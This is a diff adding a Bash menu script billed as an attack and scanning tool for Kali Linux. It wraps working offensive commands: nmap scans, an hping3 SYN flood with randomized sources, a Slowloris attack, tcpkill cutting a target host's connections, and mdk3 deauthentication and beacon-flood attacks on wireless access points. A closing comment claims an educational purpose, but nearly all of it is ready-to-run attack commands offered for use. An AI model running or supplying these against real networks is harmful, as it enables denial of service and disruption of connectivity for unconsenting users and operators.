@@ -1,0 +1,148 @@
+#!/bin/bash
+## 
+## Tested On Kali Linux
+lagi='y'
+while [ $lagi == 'y' ] || [ $lagi == 'Y' ]; 
+do
+clear
+
+cyan='\e[0;36m'
+blue='\e[0;34m'
+white='\e[1;37m'
+red='\e[1;31m'
+
+echo -e $red   "-=-=-=-=-=-=-=-==-=--=-==-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-" 
+echo -e $red     "	[*]	Welcome On Kontrakan Attack and Scaning Tool    [*]"
+echo -e	$red     "       [*]			Indonesia	                [*]"
+echo -e $red     "	[*]		    Create by : xditx32 		[*]"
+echo -e $white   "	[*]	         Thanks to Allah.S.W.T  		[*]"
+echo -e $white   "	[*]	        Version 1 Codename Beginner             [*]"
+echo -e	$white   "	[*]	        Support by Kontrakanilegal 		[*]"
+echo -e $white "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e $white "Select From Menu ==> :" $red
+echo "	[1]  Scan Live Host"
+echo "	[2]  Scan Open Port"
+echo "	[3]  Detect Netcat!"
+echo "	[4]  Select Hidden Wireless/AP"
+echo "	[5]  Search Hidden Wireless/AP"
+echo "	[6]  DOS Attack with Hping3"
+echo "	[7]  DOS Attack with Slowloris"
+echo "	[8]  Netcut With Tcpkill"
+echo "	[9]  Blocked Access Point"
+echo "	[10] Disrupt Access Point"
+echo "	[11] Network Forensic with Wireshark"
+echo "	[12] Check Tipe Komputer/Laptop"
+echo "	[13] Credit & About"
+echo "	[0]  Exit"
+echo -n -e $cyan'\033[4mKontAttack=>\033[0m'; tput sgr0 #Memasukan Pilihan Kamu
+read Pilih
+if test $Pilih == '1'
+	then
+	route -n
+echo -n -e $red "Insert Scan Range (192.168.1.1/24) : >"; tput sgr0
+	read message
+	nmap -sN $message
+
+elif test $Pilih == '2'
+ then
+echo -n -e $red "Insert Your Single Target : >"; tput sgr0
+ read message
+ 	nmap -sV $message
+
+elif test $Pilih == '3' 
+	then
+echo -n -e $red "Insert Your Interface" $white 'wlan0 or eth0 >'; read Iface
+  python NetcutKiller.py $Iface
+
+ elif test $Pilih == '4'
+ 	then
+echo -n -e $red "Insert Channel Target : >"; tput sgr0
+ read x1
+echo -n -e $red "Insert BSSID Target : >"; tput sgr0
+ read x2
+ gnome-terminal --command="airodump-ng mon0 -c $x1 --bssid $x2"
+
+elif test $Pilih == '5'
+ then
+echo -n -e $red "Insert Channel Target : >"; tput sgr0
+ read xx1
+echo-n -e $red "Insert BSSID Target : >"; tput sgr0
+ read xx2
+xterm -bg black -fg white -geometry 125x100-0+0 -e mdk mon0 p -c $xx1 -t $xx2 -b u -s 150
+
+elif test $Pilih == '6'
+ then
+echo -n -e $red "Insert Port Target default 445 > "; tput sgr0
+  read port
+echo -n -e $red "Insert Your IP Target > "; tput sgr0
+  read iptarget
+  hping3 -V -c 100000 -d 120 -S -w 64 -p $port -s 445 --flood --rand-source $iptarget
+
+elif test $Pilih == '7'
+ then
+echo -n -e $read "Insert YourTarget.com/ or IP > "; tput sgr0
+ read slowx
+ perl slowloris.pl -dns $slowx 
+
+elif test $Pilih == '8' 
+ then
+echo -n -e $red "Insert Your Interface > "; tput sgr0
+	read Msk1
+echo -n -e $red "Insert Your Target > "; tput sgr0
+	read Ta1
+   echo "1" >> /proc/sys/net/ipv4/ip_forward
+   sudo tcpkill -i $Msk1 -9 host $Ta1
+
+elif test $Pilih == '9' 
+ then
+echo -n -e $red "Insert Port Target : > " ; tput sgr0
+ read mac
+echo $mac >> whitelist.txt
+ airmon-ng start wlan0
+ mdk3 mon0 -d -w whitelist.txt
+
+elif test $Pilih == '10' 
+	then
+echo -n -e $red "Running *[edit your ssid.list]Press(Enter) : > " ; 
+  read macx
+echo $macx >> .ssid.list
+   mdk3 mon0 b -f .ssid.list 	
+
+elif test $Pilih == '11'
+ then
+	sudo wireshark
+
+elif test $Pilih == '12'
+ then
+ echo -e $red "Installing Lshw"
+  apt-get install lshw
+ echo -e $red "Running Lshw"
+  lshw 
+
+ elif test $Pilih == '13'
+  then
+   cat .about.txt
+
+ elif test $Pilih == '0'
+  then
+  echo -e $red "Thanks Kontrakanilegal (c)2014"; tput sgr0
+  echo -e $white  "Report Bug xditx32@gmail.com";
+  exit
+	
+fi 
+
+echo
+echo -e -n "Back to Menu? (y/n) :";
+read lagi;
+
+	while  [ $lagi != 'y' ] && [ $lagi != 'Y' ] && [ $lagi != 'n' ] && [ $lagi != 'N' ];
+	 do
+		echo -n "Back to menu (y/n) :";
+		read lagi;
+		done	
+
+done
+
+## Alat Ini hanya untuk tujuan "Pendidikan Saja" (Ingat Ya Ya...) !!
+## Create By xditx32
+## IF Unsoed
